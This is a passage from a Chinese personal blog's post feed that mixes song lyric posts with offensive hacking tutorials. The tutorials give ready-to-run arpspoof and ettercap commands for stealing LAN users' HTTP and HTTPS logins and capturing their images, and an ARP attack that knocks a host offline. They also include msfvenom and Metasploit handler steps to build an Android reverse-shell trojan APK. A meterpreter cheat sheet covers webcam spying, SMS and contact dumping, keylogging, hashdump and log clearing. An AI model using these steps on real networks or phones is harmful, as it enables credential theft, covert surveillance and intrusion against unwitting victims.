href="post/HTTPS-password#二、ARP欺骗和抓包获取HTTPS账号和密码"></a></h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> 1 <span class="token operator">></span>/proc/sys/net/ipv4/ip_forward<span class="token function">cat</span> /proc/sys/net/ipv4/ip_forwardarpspoof -i eth0 -t 目标IP 目标主机网关ettercap -Tq -i eth0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p>]]></content>
      
      
      <categories>
          
          <category> Kali-内网称霸 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ARP欺骗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网称霸之《HTTP账号密码获取》</title>
      <link href="/post/HTTP-password/"/>
      <url>/post/HTTP-password/</url>
      
        <content type="html"><![CDATA[<p>⭐<strong>使用工具：arpspoof、ettercap</strong><br><font face="楷体"><strong>ettercap是什么？</strong></font></p><blockquote><blockquote><p>我们在对WEB安全检测的时候都会用到Cain和netfuke这两款工具，功能相信用过的朋友多多少少都知道，但这两款工具是在windows下运行的。<br>而ettercap是在linux下运行的 。其实功能都是差不多的，我称呼它为嗅探工具，ARP欺骗，DNS，劫持，中间人攻击等等。总之这是一款强大的安全测试工具。</p></blockquote></blockquote><h4 id="一、ARP欺骗">一、ARP欺骗<a href="post/HTTP-password#一、ARP欺骗"></a></h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> 1 <span class="token operator">></span>/proc/sys/net/ipv4/ip_forward<span class="token function">cat</span> /proc/sys/net/ipv4/ip_forwardarpspoof -i eth0 -t 目标IP 目标主机网关<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="二、使用ettercap获取HTTP账号和密码">二、使用ettercap获取HTTP账号和密码<a href="post/HTTP-password#二、使用ettercap获取HTTP账号和密码"></a></h4><p><font face="楷体">另开一个终端，输入ettercap -Tq -i eth0</font></p><pre class="line-numbers language-bash"><code class="language-bash">ettercap -Tq -i eth0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><blockquote><p>-T:文本模式<br>q:安静模式<br>i:指定网卡<br>成功后当靶机浏览HTTP网页试用账号和密码登陆时，这个终端窗口就会显示相应的url、账号、密码。<br>💛💙❤注意：当对方的用户名是使用中文登陆的，则终端窗口账号处显示的是编码，则需要使用到url解码，将这串编码解码成中文。</p></blockquote></blockquote><p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p>]]></content>
      
      
      <categories>
          
          <category> Kali-内网称霸 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ARP欺骗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网称霸之《arp欺骗获取目标主机浏览的图片》</title>
      <link href="/post/arp-picture/"/>
      <url>/post/arp-picture/</url>
      
        <content type="html"><![CDATA[<p>⭐<strong>使用工具：arpspoof、driftnet</strong><br>&nbsp;</p><h3 id="一、ARP欺骗、流量转发">一、ARP欺骗、流量转发<a href="post/arp-picture#一、ARP欺骗、流量转发"></a></h3><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#D1EEEE">第一步“开启ip转发”命令:echo 1 >/proc/sys/net/ipv4/ip_forward        （回车没有任何的返回）第二步查看转发是否成功第三步另开窗口“开始欺骗”命令：arpspoof -i eth0 -t 192.168.1.10 192.168.1.1        （回车之后不断欺骗运行中~~~[记得这个窗口需要保留]）</td></tr></table></div></div><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> 1 <span class="token operator">></span>/proc/sys/net/ipv4/ip_forward<span class="token function">cat</span> /proc/sys/net/ipv4/ip_forwardarpspoof -i eth0 -t 192.168.1.10 192.168.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="二、使用driftnet获取图片">二、使用driftnet获取图片<a href="post/arp-picture#二、使用driftnet获取图片"></a></h3><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#D1EEEE">命令：driftnet -i eth0（获取的图片会自动给保存，可以看它新开窗口的保存路径）“查看目标的图片信息”弹出的窗口请不要关闭，在窗口就可以看到获取信息。</td></tr></table></div></div><pre class="line-numbers language-bash"><code class="language-bash">driftnet -i eth0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p>]]></content>
      
      
      <categories>
          
          <category> Kali-内网称霸 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ARP欺骗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网称霸之《ARP欺骗断网攻击》</title>
      <link href="/post/ARP-Broken-network/"/>
      <url>/post/ARP-Broken-network/</url>
      
        <content type="html"><![CDATA[<p>⭐<strong>使用工具：arpspoof</strong><br><font face="楷体"><strong>什么是ARP?</strong></font></p><blockquote><blockquote><p>&emsp; ARP（Address Resolution Protocol，地址解析协议）是一个位于TCP/IP协议栈中的 低层协议，负责将某个IP地址解析成对应的MAC地址。<br><font face="楷体"><strong>什么是ARP欺骗?</strong></font><br>&emsp;从影响网络连接通畅的方式来看，ARP欺骗分为两种，一种是对路由器ARP表的欺骗；另一种是对内网PC的网关欺骗。<br>&emsp;第一种ARP欺骗的原理是——截获网关数据。它通知路由器一系列错误的内网MAC地址，并按照一定的频率不断进行，使真实的地址信息无法通过更新保存在路由器中，结果路由器的所有数据只能发送给错误的MAC地址，造成正常PC无法收到信息。第二种ARP欺骗的原理是——伪造网关。它的原理是建立假网关，让被它欺骗的PC向假网关发数据，而不是通过正常的路由器途径上网。在PC看来，就是上不了网了，“网络掉线了”。<br>&emsp;实际上ARP欺骗是一种中间人攻击，攻击者通过毒化受害者的ARP缓存，将网关的MAC替换成攻击者的MAC，于是攻击者的主机实际上就充当了受害主机的网关，之后攻击者就可以截获受害者发出和接到的数据包，从中获取账号密码、银行卡信息等。</p></blockquote></blockquote><hr><hr><p><font face="楷体">特别提示：<br>1、arpspoof是“Dsniff网络嗅探工具包“其中的一个工具；<br>2、使用arpspoof前内核“IP转发”功能（或完成相同的功能程序，例如fragrouter）必须提前打开。</font><br>&nbsp;</p><h3 id="一、ARP断网攻击用法">一、ARP断网攻击用法<a href="post/ARP-Broken-network#一、ARP断网攻击用法"></a></h3><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#D1EEEE">1.先ping目标主机，ping通的主机才能欺骗；2.若是不知目标主机IP，那就先查看本机IP，比如本机是192.168.1.201；3.可以用fping -asg 192.168.1.0/24查看局域网内所有存活的主机IP，推荐查看IP列表中存  活的IP，因为有的IP不能直接给出是存活的；4.使用模板：arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host即：arpspoof -i eth0 -t 192.168.1.201 192.168.1.15.如此就能使目标主机在ARP欺骗期间处于断网状态。</td></tr></table></div></div><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ifconfig</span>fping -asg 192.168.1.0/24<span class="token function">ping</span> 192.168.1.201arpspoof -i eth0 -t 192.168.1.201 192.168.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><blockquote><p>提示：<br>-i interface          指定要使用的接口。<br>-c own|host|both      指定范围own|host|both（自己|主机|两者）。<br>-t target             指定一台特定主机为ARP中毒（如果未指定，则为LAN上的所有主机）。<br>-r<br>host                  指定您希望拦截数据包的主机（通常是本地网关）。</p></blockquote></blockquote><p>&nbsp;</p><h3 id="二、开启流量转发">二、开启流量转发<a href="post/ARP-Broken-network#二、开启流量转发"></a></h3><p>使目标的IP流量经过我的网卡，进行IP流量转发，让目标主机正常上网：</p><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#D1EEEE">1.ARP欺骗之前先开启流量转发，使用echo 1 > /proc/sys/net/ipv4/ip_forward2.使用命令：cat /proc/sys/net/ipv4/ip_forward,显示1表示成功开启转发功能，0表示未开启;3.另开一个窗口：arpspoof -i eth0 -t 192.168.1.201 192.168.1.1进行欺骗；4.若目标主机能正常上网，则流量转发成功，否则流量转发未成功；5.本机（虚拟机）就被靶机当成网关了（即实际网关和攻击主机的物理地址一样）</td></tr></table></div></div><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> 1 <span class="token operator">></span> /proc/sys/net/ipv4/ip_forward<span class="token function">cat</span> /proc/sys/net/ipv4/ip_forwardarpspoof -i eth0 -t 192.168.1.201 192.168.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Kali-内网称霸 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ARP欺骗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>资源</title>
      <link href="/post/Resourses/"/>
      <url>/post/Resourses/</url>
      
        <content type="html"><![CDATA[<p>&ensp;<br><font face="楷体" color="red" size="6">资源目录</font><font face="楷体" color="red">(点击相应资源会跳转哦)</font>😜</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th>书籍</th><th align="center">提取码</th><th align="center">视频</th><th align="center">提取码</th></tr></thead><tbody><tr><td><a href="https://pan.baidu.com/s/1XM04ptOY0qaS3iVu3VQoLQ" target="_blank" rel="noopener">安全牛 — Kali Linux渗透测试(转录)</a></td><td align="center">Numb1</td><td align="center"><a href="https://pan.baidu.com/s/1RHU4z4xr5sxLuqbkdwP_Lw" target="_blank" rel="noopener">安全牛 — Kali Linux渗透测试(转录)</a></td><td align="center">Numb2</td></tr><tr><td><a href="https://pan.baidu.com/s/1fUNe2Q7aiQxtzEomXgLjYQ" target="_blank" rel="noopener">算法设计与分析课件</a></td><td align="center">Numb3</td><td align="center"><a href="https://pan.baidu.com/s/1Fmi9FpCbcoR-NBLap8KivQ" target="_blank" rel="noopener">Kali渗透培训课程-逆小战</a></td><td align="center">Numb4</td></tr><tr><td><a href="https://pan.baidu.com/s/1rERpm9Bm2zSzNhYPbUuh6Q" target="_blank" rel="noopener">信息安全数学基础课件</a></td><td align="center">Numb5</td><td align="center"><a href="https://pan.baidu.com/s/1-lldqvPgcnNC3kjJmoS12A" target="_blank" rel="noopener">SQLMAP注入牛人讲解</a></td><td align="center">Numb6</td></tr><tr><td><a href="https://pan.baidu.com/s/1iwev5nNX6DHjbHFwAPyeag" target="_blank" rel="noopener">Java课件</a></td><td align="center">Numb7</td><td align="center"><a href="https://pan.baidu.com/s/1Ur8wapZIbNsMu-h4YosvOQ" target="_blank" rel="noopener">Burpsuite视频教程</a></td><td align="center">Numb8</td></tr><tr><td><a href="https://pan.baidu.com/s/16_a1uYNgfQwaVZwvxW7Kog" target="_blank" rel="noopener">Java 2 核心技术，卷I：基础知识（原书第7版）</a></td><td align="center">Numb9</td><td align="center"><a href="https://pan.baidu.com/s/1g2IF-com9z3qwpacugslhA" target="_blank" rel="noopener">Burpsuite渗透软件教程</a></td><td align="center">Numb10</td></tr><tr><td><a href="https://pan.baidu.com/s/1DeyFfBjjzFVE4Z8B5-GsHA" target="_blank" rel="noopener">Dreaming in Code</a></td><td align="center">Numb11</td><td align="center"><a href="https://pan.baidu.com/s/1txPt1Dz3q0rdaTBRvGf9eQ" target="_blank" rel="noopener">Web基础</a></td><td align="center">Numb12</td></tr><tr><td><a href="https://pan.baidu.com/s/1HOw_KSFvVhKIW7UW8hZ9eA" target="_blank" rel="noopener">梦断代码</a></td><td align="center">Numb13</td><td align="center"><a href="https://pan.baidu.com/s/16kHmbDuNz6tyJxKFpVqNOg" target="_blank" rel="noopener">Web漏洞讲解</a></td><td align="center">Numb14</td></tr></tbody></table></div></div>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>叶雪如-《水星记》《体面》收藏版</title>
      <link href="/post/%E5%8F%B6%E9%9B%AA%E5%A6%82-%E3%80%8A%E6%B0%B4%E6%98%9F%E8%AE%B0%E3%80%8B%E3%80%8A%E4%BD%93%E9%9D%A2%E3%80%8B%E6%94%B6%E8%97%8F%E7%89%88/"/>
      <url>/post/%E5%8F%B6%E9%9B%AA%E5%A6%82-%E3%80%8A%E6%B0%B4%E6%98%9F%E8%AE%B0%E3%80%8B%E3%80%8A%E4%BD%93%E9%9D%A2%E3%80%8B%E6%94%B6%E8%97%8F%E7%89%88/</url>
      
        <content type="html"><![CDATA[<p><font face="楷体"><strong>《水星记》</strong></font></p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=551971760&auto=0&height=66"></iframe>&emsp;[Music Video](https://music.163.com/video?id=DDEBA0F86AE2F084FC5084286D5886A1)&nbsp;<font face="楷体">**《体面》**</font><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=3&id=1369442255&auto=0&height=66"></iframe>&emsp;[Music Video](https://music.163.com/#/video?id=53D34649111D82B977A09F4F2A1ED3BB&userid=455041480)  ![FSbHUS.md.jpg](https://s1.ax1x.com/2018/11/19/FSbHUS.jpg)<font face="楷体">**叶雪如**</font>&emsp;[微博](https://weibo.com/irisyxr?topnav=1&wvr=6&topsug=1&is_hot=1)&emsp;[唱吧](https://changba.com/u/238069476)&emsp;[网易云音乐](https://music.163.com/#/artist?id=12457100) &nbsp;<center><font face="楷体"></font><h6 id="《水星记》"><a href="#《水星记》" class="headerlink" title="《水星记》"></a><center><font face="楷体">《水星记》</font></center></h6><center><font face="楷体">作曲 : 郭顶作词 : 郭顶水星记 - 郭顶词：郭顶曲：郭顶COVER-叶雪如着迷于你眼睛银河有迹可循穿过时间的缝隙它依然真实地吸引我轨迹这瞬眼的光景最亲密的距离沿着你皮肤纹理 走过曲折手臂做个梦给你做个梦给你等到看你银色满际等到分不清季节更替才敢说沉溺还要多远才能进入你的心还要多久才能和你接近咫尺远近却无法靠近的那个人也等着和你相遇环游的行星怎么可以拥有你这瞬眼的光景最亲密的距离沿着你皮肤纹理走过曲折手臂做个梦给你做个梦给你等到看你银色满际等到分不清季节更替才敢说沉溺还要多远才能进入你的心还要多久才能和你接近咫尺远近却无法靠近的那个人也等着和你相遇环游的行星怎么可以拥有你还要多远才能进入你的心还要多久才能和你接近咫尺远近却无法靠近的那个人要怎么探寻要多么幸运才敢让你发觉你并不孤寂当我还可以再跟你飞行环游是无趣至少可以陪着你</font><p>&nbsp;<br>&nbsp;<br>&nbsp;</p><h6 id="《体面》"><a href="#《体面》" class="headerlink" title="《体面》"></a><center><font face="楷体">《体面》</font></center></h6><center><font face="楷体">别堆砌怀念让剧情变得狗血深爱了多年又何必毁了经典都已成年不拖不欠浪费时间是我情愿像谢幕的演员眼看着灯光熄灭来不及再轰轰烈烈就保留告别的尊严我爱你不后悔也尊重故事结尾分手应该体面谁都不要说抱歉何来亏欠我敢给就敢心碎镜头前面是从前的我们在喝彩流着泪声嘶力竭离开也很体面才没辜负这些年爱得热烈认真付出的画面别让执念毁掉了昨天我爱过你利落干脆最熟悉的街主角却换了人演我哭到哽咽心再痛就当破茧来不及再轰轰烈烈就保留告别的尊严我爱你不后悔也尊重故事结尾分手应该体面谁都不要说抱歉何来亏欠我敢给就敢心碎镜头前面是从前的我们在喝彩流着泪声嘶力竭离开也很体面才没辜负这些年爱得热烈认真付出的画面别让执念毁掉了昨天我爱过你利落干脆再见不负遇见</font><p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p><iframe src="//player.bilibili.com/player.html?aid=21210560&cid=34835011&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe></center></center></center>]]></content>
      
      
      <categories>
          
          <category> 音乐 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>薛之谦-《肆无忌惮》专辑</title>
      <link href="/post/%E8%96%9B%E4%B9%8B%E8%B0%A6-%E3%80%8A%E8%82%86%E6%97%A0%E5%BF%8C%E6%83%AE%E3%80%8B%E4%B8%93%E8%BE%91/"/>
      <url>/post/%E8%96%9B%E4%B9%8B%E8%B0%A6-%E3%80%8A%E8%82%86%E6%97%A0%E5%BF%8C%E6%83%AE%E3%80%8B%E4%B8%93%E8%BE%91/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="110" src="//music.163.com/outchain/player?type=2&id=557581967&auto=0&height=66"></iframe><center><font face="楷体">作曲 : 张洢豪作词 : 薛之谦角色精湛 主题略荒诞理由太短 是让人不安疑信参半 却无比期盼你的惯犯 圆满别让纠缠 显得 孤单你肆无忌惮 你急着闹翻用词刁钻 要观后感爱本是两端 要倾斜不难 要摧毁简单我顺其自然 我表现勇敢补缺填满 随意调侃爱会变习惯 维护者喜欢 自愈的快感理由丰满 角色越骨感染上情感 退让都不谈承载过半 还奋力纠缠你的预判 圆满我尽量延缓 胡闹狂欢你肆无忌惮 你急着闹翻用词刁钻 要观后感爱本是两端 要倾斜不难 要摧毁简单我违背自然 我表演勇敢宁缺勿滥 严加看管无用的手段 维护者习惯 让自己难堪最后的离散 请用词温暖制作人：张洢豪编曲： 张洢豪、Eric Juu木吉他：张洢豪电吉他：Derrick Sepnio钢琴：Eric JuuBass：Rayvaughn Covington鼓：Padget Nanton III合声：薛之谦人声录制：汝文博@BIG.J Studio乐器录制：Tsang Yat Lung@Non Sound Studio混音：赵靖@BIG.J Studio母带：全相彦@OK Mastering Studio</font><p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p></center>]]></content>
      
      
      <categories>
          
          <category> 音乐 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>薛之谦-《那是你离开了北京的生活》专辑</title>
      <link href="/post/%E8%96%9B%E4%B9%8B%E8%B0%A6-%E3%80%8A%E9%82%A3%E6%98%AF%E4%BD%A0%E7%A6%BB%E5%BC%80%E4%BA%86%E5%8C%97%E4%BA%AC%E7%9A%84%E7%94%9F%E6%B4%BB%E3%80%8B%E4%B8%93%E8%BE%91/"/>
      <url>/post/%E8%96%9B%E4%B9%8B%E8%B0%A6-%E3%80%8A%E9%82%A3%E6%98%AF%E4%BD%A0%E7%A6%BB%E5%BC%80%E4%BA%86%E5%8C%97%E4%BA%AC%E7%9A%84%E7%94%9F%E6%B4%BB%E3%80%8B%E4%B8%93%E8%BE%91/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="110" src="//music.163.com/outchain/player?type=2&id=571340283&auto=0&height=66"></iframe><center><font face="楷体">作曲 : 方毅作词 : 薛之谦试着留盏灯假装陪伴失眠的我窗口就有等待的效果已经习惯摆放好两人份的餐桌这样看上去就不寂寞那是你离开了北京的生活街上的人偶尔会模仿你小动作轻而易举就能将我击破那些承诺提起人是你 还是我那是你离开了北京的生活我以为我爱了 就会留下些什么 纪念那些曲折我们快乐的争吵的不舍的分分合合我还是撑着 不说 我应该平静的面对你离开了北京的生活是否有人在对街窥探我的生活督促我别过的不快乐一晃而过看不清的是你 还是我那是你离开了北京的生活我以为我疯了 你在提醒我什么 别再故意招惹那些爱过的 美好的 快乐的 不是施舍我还是撑着 不说 我可以平静的接受你离开了北京的生活我以为是规则 失去最爱的一个 才能记忆深刻那些 幼稚的 轻狂的 勇敢的 从此收着我还在羡慕什么 街上哭的那个你却无比希望他抱住另一个那是你离开了北京的生活制作人：方毅编曲：茶茶木吉他：郭一凡电吉他：劳国贤贝斯：韩阳鼓手：武勇恒和声：方毅和声设计：茶茶 方毅弦乐团：国际首席爱乐乐团弦乐监制：胡静成弦乐录音师：王小四弦乐录音室：金田录音棚乐器录音师：邢铜乐器录音室：55TEC Studio人声录音师：汝文博人声录音室：BIG.J Studio混音师：赵靖混音室：BIG.J Studio母带：全相彦@OK Mastering Studio</font><p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p></center>]]></content>
      
      
      <categories>
          
          <category> 音乐 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>薛之谦-《怪咖》专辑</title>
      <link href="/post/%E8%96%9B%E4%B9%8B%E8%B0%A6-%E3%80%8A%E6%80%AA%E5%92%96%E3%80%8B%E4%B8%93%E8%BE%91/"/>
      <url>/post/%E8%96%9B%E4%B9%8B%E8%B0%A6-%E3%80%8A%E6%80%AA%E5%92%96%E3%80%8B%E4%B8%93%E8%BE%91/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="110" src="//music.163.com/outchain/player?type=2&id=574921549&auto=0&height=66"></iframe><center><font face="楷体">作曲 : 薛之谦作词 : 薛之谦你的改变 很难制止了我的取悦 也不是天生的熟练了 喜怒就合并了你的理由是星星点点的我尽量充当气氛营造者练就成了 无痛的角色再听多几次分开的话越致命越不正面回答感情里的怪咖 有铺垫就不尴尬所以要找个延期方法既平静还能突然挣扎我自愿作怪咖 就不怕被你笑话你的铺垫 零零散散的别去揭穿 话题制造者我记得 你也会不舍我偶尔取悦也会失手的搞笑的人变成做恶的我习惯了 无痛的货色再听多几次分开的话越致命越不正面回答感情里的怪咖 有铺垫就不尴尬所以要找个延期方法既平静还能突然挣扎我自愿作怪咖 就不怕被你笑话你还有几次分开的话新鲜感不佳词语匮乏感情里的怪咖 可手里也没筹码所以要找个缓冲方法直到有天我也放得下我不是个怪咖 是不计较的惩罚感情里的怪咖 再难过也笑着说吧</font><p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p></center>]]></content>
      
      
      <categories>
          
          <category> 音乐 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit之渗透安卓实战</title>
      <link href="/post/Metasploit3/"/>
      <url>/post/Metasploit3/</url>
      
        <content type="html"><![CDATA[<p>&nbsp;<br>&nbsp;</p><h4 id="Metasploit之渗透安卓实战"><font face="楷体">Metasploit之渗透安卓实战</font><a href="post/Metasploit3#Metasploit之渗透安卓实战"></a></h4><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#D1EEEE">&emsp;在之前的Metaspoloit使用中都是在Windows系统中，因为渗透的是Windows系统，所以选用了“windows/meterpreter/reverse_tcp”模块。而这里需要渗透安卓系统了，就选用“android/meterpreter/reverse_tcp”模块。那么对于kali-linux连接木马的方式还是和之前的一样，利用“exploit/multi/handler”并且，同样需要选用“windows/meterpreter/reverse_tcp”的PAYLOAD这里假设我的测试环境kali-linux：  192.168.2.146安卓模拟环境：192.168.2.107</td></tr></table></div></div><p>&nbsp;</p><h5 id="一、生成远程安卓木马"><font face="楷体">一、生成远程安卓木马</font><a href="post/Metasploit3#一、生成远程安卓木马"></a></h5><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#D1EEEE"><font color="#dd0000">msfconsolemsfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=4444 R > payload.apk</font></td></tr></table></div></div><blockquote><blockquote><p>命令解析：<br>p 设置要使用的payload<br>LHOST 设置用来接收反弹连接的主机（kali-linux的IP）<br>LPORT 设置用来接收反弹连接的端口（kali-linux的端口）<br>R 设置文件格式<br>Location 要保存的文件位置–&gt;/root/Desktop/是桌面，没有目录表示当前系统Home目录下<br>PS：对于目前的安卓系统安全机制的考虑，因为没有签名证书可能导致无法安装或易被受害者识破<br>那么，签名证书的制作可以查看参考文献资料</p></blockquote></blockquote><p>&nbsp;</p><h5 id="二、开启metasploit，并且开启相关连接"><font face="楷体">二、开启metasploit，并且开启相关连接</font><a href="post/Metasploit3#二、开启metasploit，并且开启相关连接"></a></h5><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#D1EEEE"><font color="#dd0000">msfconsoleuse exploit/multi/handlerset PAYLOAD android/meterpreter/reverse_tcpset LHOST 192.168.2.146set LPORT 4444exploit</font></td></tr></table></div></div><p>&nbsp;</p><h5 id="三、meterpreter连接"><font face="楷体">三、meterpreter连接</font><a href="post/Metasploit3#三、meterpreter连接"></a></h5><p><font face="楷体">&emsp;安卓手机安装并且打开木马后会返回我们一个meterpreter连接,那么我们可以使用以下的一些常用的命令:</font></p><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#D1EEEE"><font color="#dd0000">cd               -->目录切换，命令：cd /  切换到根目录search           -->搜索文件，命令：search text.jpgdownload         -->下载文件，命令：download test.jpgwebcam_list      -->查看摄像头列表，因为手机都是前置和后置摄像头了webcam_snap      -->拍照一张，需要选用前置或者后置摄像头，命令：webcam_snap -i 1webcam_stream    -->开启摄像头视频监控，同上，命令：webcam_stream -i 1</font><font color="#dd0000">安卓系统相关命令：check_root       -->查看当前安卓是否已经rootdump_calllog     -->下载通话记录dump_contacts    -->下载短信记录dump_sms         -->下载通讯录geolocate        -->利用谷歌地图定位（需要安装谷歌地图）</font></td></tr></table></div></div><p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p>]]></content>
      
      
      <categories>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 远程木马攻击 </tag>
            
            <tag> 安卓渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit工具Meterpreter的命令速查表</title>
      <link href="/post/Metasploit2/"/>
      <url>/post/Metasploit2/</url>
      
        <content type="html"><![CDATA[<p>&nbsp;<br>&nbsp;</p><h4 id="msfpayload反弹shell使用的一些命令集"><font face="楷体">msfpayload反弹shell使用的一些命令集</font><a href="post/Metasploit2#msfpayload反弹shell使用的一些命令集"></a></h4><p>&nbsp;</p><h5 id="一、核心命令-–-帮助菜单">一、核心命令 – 帮助菜单<font face="Arail"></font><a href="post/Metasploit2#一、核心命令-–-帮助菜单"></a></h5><blockquote><blockquote><p><font color="#dd0000">background</font> – 将当前会话移动到背景变成一个session，当再次使用时再用sessions -i ID调用<br>bgkill – 杀死一个背景 meterpreter 脚本<br>bglist – 提供所有正在运行的后台脚本的列表<br>bgrun – 作为一个后台线程运行脚本<br>channel – 显示活动频道<br>close – 关闭通道<br>exit – 终止 meterpreter 会话<br>help – 帮助菜单<br>interact – 与通道进行交互<br>irb – 进入 Ruby 脚本模式<br><font color="#dd0000">migrate</font> – 移动到一个指定的 PID 的活动进程<br>quit – 终止 meterpreter 会话<br>read – 从通道读取数据<br><font color="#dd0000">run</font> – 执行以后它选定的 meterpreter 脚本<br>use – 加载 meterpreter 的扩展<br>write – 将数据写入到一个通道<br></p></blockquote></blockquote><h4 id="二、文件系统命令"><font color="#dd0000">二、文件系统命令</font><font face="Arail"></font><a href="post/Metasploit2#二、文件系统命令"></a></h4><blockquote><blockquote><p>cat -读取并输出到标准输出文件的内容<br>cd -更改目录对受害人<br>del -删除文件对受害人<br>download-从受害者系统文件下载<br>edit-用 vim编辑文件<br>getlwd -打印本地目录<br>getwd -打印工作目录<br>lcd -更改本地目录<br>lpwd -打印本地目录<br>ls -列出在当前目录中的文件列表<br>mkdir -在受害者系统上的创建目录<br>pwd -输出工作目录<br>rm -删除文件<br>rmdir -受害者系统上删除目录<br>upload-从攻击者的系统往受害者系统上传文件<br></p></blockquote></blockquote><h4 id="三、网络命令">三、网络命令<font face="Arail"></font><a href="post/Metasploit2#三、网络命令"></a></h4><blockquote><blockquote><p>portfwd -端口转发<br>route -查看或修改受害者路由表<br></p></blockquote></blockquote><h4 id="四、系统命令">四、系统命令<font face="Arail"></font><a href="post/Metasploit2#四、系统命令"></a></h4><blockquote><blockquote><p>clearav -清除了受害者的计算机上的事件日志<br>drop_token -被盗的令牌<br>execute-执行命令<br>getpid -获取当前进程 ID (PID)<br>getprivs -尽可能获取尽可能多的特权<br>getuid -获取作为运行服务器的用户<br>kill -终止指定 PID 的进程<br><font color="#dd0000">ps</font> -列出正在运行的进程<br>reboot-重新启动受害人的计算机<br>reg -与受害人的注册表进行交互<br>rev2self -在受害者机器上调用 RevertToSelf()<br><font color="#dd0000">shell</font> -在受害者计算机上打开一个shell<br>shutdown-关闭了受害者的计算机<br>steal_token -试图窃取指定的 (PID) 进程的令牌<br>sysinfo -获取有关受害者计算机操作系统和名称等的详细信息<br></p></blockquote></blockquote><h5 id="五、用户界面命令">五、用户界面命令<font face="Arail"></font><a href="post/Metasploit2#五、用户界面命令"></a></h5><blockquote><blockquote><p>enumdesktops -列出所有可访问台式机<br>getdesktop -获取当前的 meterpreter 桌面<br>idletime -检查长时间以来，受害者系统空闲进程<br>keyscan_dump -键盘记录软件的内容转储<br>keyscan_start -启动时与如 Word 或浏览器的进程相关联的键盘记录软件<br>keyscan_stop -停止键盘记录软件<br>screenshot-抓去 meterpreter 桌面的屏幕截图<br>set_desktop -更改 meterpreter 桌面<br>uictl -启用用户界面组件的一些控件<br></p></blockquote></blockquote><h4 id="六、特权升级命令">六、特权升级命令<font face="Arail"></font><a href="post/Metasploit2#六、特权升级命令"></a></h4><blockquote><blockquote><p>getsystem -获得系统管理员权限<br></p></blockquote></blockquote><h4 id="七、密码转储命令">七、密码转储命令<font face="Arail"></font><a href="post/Metasploit2#七、密码转储命令"></a></h4><blockquote><blockquote><p>hashdump -抓去哈希密码 (SAM) 文件中的值<br></p></blockquote></blockquote><h4 id="八、Timestomp-命令">八、Timestomp 命令<font face="Arail"></font><a href="post/Metasploit2#八、Timestomp-命令"></a></h4><blockquote><blockquote><p>timestomp -操作修改，访问，并创建一个文件的属性<br></p></blockquote></blockquote><p>&nbsp;<br>&nbsp;<br>&nbsp;</p>]]></content>
      
      
      <categories>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 远程木马攻击 </tag>
            
            <tag> Meterpreter命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>薛之谦-《渡》专辑</title>
